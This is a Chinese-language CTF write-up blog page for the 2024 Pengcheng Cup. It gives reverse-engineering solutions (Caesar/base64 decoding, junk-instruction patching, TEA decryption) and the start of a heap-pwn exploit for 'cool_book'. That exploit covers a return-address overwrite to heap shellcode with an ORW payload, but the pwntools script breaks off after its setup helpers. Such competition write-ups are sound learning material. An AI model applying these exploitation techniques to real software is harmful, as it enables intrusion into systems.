@@ -1,0 +1,309 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>鹏程杯-2024 | Bosh's Blog</title><meta name="author" content="bosh"><meta name="copyright" content="bosh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="包菜的，虽然都没怎么做出来 但也是复现出来了  REjoyVBS-pcb2024打开时一个已VBS结尾的文件 第一次做 上网查了一手   直接实操一手，直接就跑出来了  就是一道凯撒加base64编码 很简单的也是，偏移为14 直接解就行 12345678910111213141516171819202122232425import base64def caesar_cipher(text, s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="鹏程杯-2024">
+<meta property="og:url" content="http://example.com/2024/11/13/%E9%B9%8F%E7%A8%8B%E6%9D%AF-2024/index.html">
+<meta property="og:site_name" content="Bosh&#39;s Blog">
+<meta property="og:description" content="包菜的，虽然都没怎么做出来 但也是复现出来了  REjoyVBS-pcb2024打开时一个已VBS结尾的文件 第一次做 上网查了一手   直接实操一手，直接就跑出来了  就是一道凯撒加base64编码 很简单的也是，偏移为14 直接解就行 12345678910111213141516171819202122232425import base64def caesar_cipher(text, s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z-bosh.github.io/img/match4.jpg">
+<meta property="article:published_time" content="2024-11-13T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-13T08:46:44.269Z">
+<meta property="article:author" content="bosh">
+<meta property="article:tag" content="linux、pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z-bosh.github.io/img/match4.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/11/13/%E9%B9%8F%E7%A8%8B%E6%9D%AF-2024/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '鹏程杯-2024',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-13 08:46:44'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://z-bosh.github.io/img/match4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bosh's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">鹏程杯-2024</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">鹏程杯-2024</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-13T00:00:00.000Z" title="发表于 2024-11-13 00:00:00">2024-11-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-13T08:46:44.269Z" title="更新于 2024-11-13 08:46:44">2024-11-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9Bwp/">比赛wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>包菜的，虽然都没怎么做出来</p>
+<p>但也是复现出来了</p>
+</blockquote>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="joyVBS-pcb2024"><a href="#joyVBS-pcb2024" class="headerlink" title="joyVBS-pcb2024"></a>joyVBS-pcb2024</h2><p>打开时一个已VBS结尾的文件</p>
+<p>第一次做</p>
+<p>上网查了一手</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131225367.png" alt="image-20241113122503256"></p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131225164.png" alt="image-20241113122515099"></p>
+<p>直接实操一手，直接就跑出来了</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131225451.png" alt="image.png"></p>
+<p>就是一道凯撒加base64编码</p>
+<p>很简单的也是，偏移为14</p>
+<p>直接解就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密的字符串和偏移量</span></span><br><span class="line">encrypted_text = <span class="string">&quot;NalvN3hKExBtALBtInPtNHTnKJ80L3JtqxTboRA/MbF3LnT0L2zHL2SlqnPtJLAnFbIlL2SnFT8lpzFzA2JHrRTiNmT9&quot;</span></span><br><span class="line">shift = <span class="number">26</span> - (<span class="number">9</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">1</span>)  <span class="comment"># qwfe = 9 + 2 + 2 + 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：凯撒解密</span></span><br><span class="line">decrypted_caesar = caesar_cipher(encrypted_text, shift)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：Base64解码</span></span><br><span class="line">decoded_flag = base64.b64decode(decrypted_caesar).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密得到的 FLAG:&quot;</span>, decoded_flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里我是懒了直接喂给GPT的</p>
+<h2 id="Rafflesia-pcb2024"><a href="#Rafflesia-pcb2024" class="headerlink" title="Rafflesia-pcb2024"></a>Rafflesia-pcb2024</h2><p>这是道花指令的题</p>
+<p>由于好久没逆了，本来就菜结果跟不会了，还是跟着复现了一手</p>
+<p>打开之后很明显的花指令</p>
+<p>so，我们nop一手</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131235868.png" alt="image-20241113123537797"></p>
+<p>反编译成功后是有个base编码和加了个异或0x18的问题</p>
+<p>但是问题肯定不会这么简单</p>
+<p>SO，在我们动调的时候就发现了，肯定是还有东西的</p>
+<p>函数栏里找到callback函数</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131237078.png" alt="image-20241113123757982"></p>
+<p>在nop一手</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131344271.png" alt="image-20241113134417171"></p>
+<p>遇到JZ的时候换一手就可以了</p>
+<p>导航图动调一手就可以发现有一个换表的过程</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131342977.png" alt="image-20241113134240903"></p>
+<p>最后直接换表就行了</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131345095.png" alt="img"></p>
+<h2 id="RE5-pcb2024"><a href="#RE5-pcb2024" class="headerlink" title="RE5-pcb2024"></a>RE5-pcb2024</h2><p>打开是一个tea加密</p>
+<p>动调的时候</p>
+<p>我们会发现有两个触零异常</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131606425.png" alt="image-20241113160617377"></p>
+<p>然后我们继续跟着异常函数走</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131607079.png" alt="image-20241113160754026"></p>
+<p>记住这两个常数</p>
+<p>其实大概意思就是在进入tea加密前触发srand(0)函数，以他的时间种子为0生成随机数</p>
+<p>然后再进入tea加密之后，在<img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131626200.png" alt="image-20241113162602156"></p>
+<p>触发第二次触零异常，也就是说这里替换了V4的值，这里可以手动动调验证</p>
+<blockquote>
+<p>虽然这里写的是**-&#x3D;**但是我们看汇编代码的时候可以发现他这里是add</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131627348.png" alt="image-20241113162750306"></p>
+</blockquote>
+<p>下面是动调验证</p>
+<p>当我们第一次经过V4时</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131630836.png" alt="image-20241113163030809"></p>
+<p>第二次经过时</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202411131631669.png" alt="image-20241113163113644"></p>
+<p>然后我们正常验证一下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		a=<span class="built_in">rand</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>,a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////</span></span><br><span class="line"><span class="comment">//0x26,0x1e27,0x52f6,0x985,0x2297,0x2e15,0x20ad,0x7e1d,0x28d2,0x7794,0x16dd,0x6dc4,0x476,0x119,0x5039,0x3e31,0x22f1,0x66ad,0xbb5,0x3958,0x51f0,0x7c93,0x5497,0x6532,0x4819,0x52b,0x70d1,0x8c0,0x25fd,0x7e16,0x98e,0x24e,</span></span><br></pre></td></tr></table></figure>
+
+<p>真好就是我们所验证的值，所以我们知道每一次的V4都会被替换成相应的随机数值</p>
+<p>然后我们继续往下走就可以发现我们的密钥其实也是被替换了</p>
+<p>被替换成2，2，3，3</p>
+<p>然后正常解就行了</p>
+<p>EXP如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_401140_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+64h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+68h] [ebp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+6Ch] [ebp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+70h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>; <span class="comment">// 初始化 v4 为 32 轮加密后的值</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> temp[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sumtemp=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//printf(&quot;\n第n轮：data:\n&quot;);</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">32</span>;k++)</span><br><span class="line">  &#123;</span><br><span class="line">  	temp[k]=<span class="built_in">rand</span>();</span><br><span class="line">  	<span class="comment">//printf(&quot;0x%x,&quot;,temp[k]);</span></span><br><span class="line">  	sumtemp=sumtemp+temp[k];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    v5 -= (a2[<span class="number">3</span>] + (v6 &gt;&gt; <span class="number">5</span>)) ^ (sumtemp + v6) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v6);</span><br><span class="line">    v6 -= (a2[<span class="number">1</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (sumtemp + v5) ^ (*a2 + <span class="number">16</span> * v5);</span><br><span class="line">    sumtemp -= temp[<span class="number">31</span>-i]; <span class="comment">// 每轮恢复时增加 delta</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">32</span>]=&#123;<span class="number">0xea2063f8</span>,<span class="number">0x8f66f252</span>,<span class="number">0x902a72ef</span>,<span class="number">0x411fda74</span>,<span class="number">0x19590d4d</span>,<span class="number">0xcae74317</span>,<span class="number">0x63870f3f</span>,<span class="number">0xd753ae61</span>&#125;;</span><br><span class="line">  	<span class="type">unsigned</span> <span class="type">int</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>&#125;;  </span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数  </span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sub_401140_decrypt</span>(&amp;v[<span class="number">2</span>*i], k);</span><br><span class="line">		<span class="comment">//sub_401140_decrypt(v, k);</span></span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">//printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="cool-book"><a href="#cool-book" class="headerlink" title="cool_book"></a>cool_book</h2><p>是到堆题，直接贴EXP了</p>
+<blockquote>
+<p>整体思路如下：</p>
+<p>50个堆块都创建完后并且返回main函数后，刚好可以溢出v6越界覆盖返回地址为堆地址写shellcode，又由于开了沙箱，所以直接手写一点写汇编打orw即可。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*  </span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.18.25&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">    p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32</span>():</span><br><span class="line">    <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span 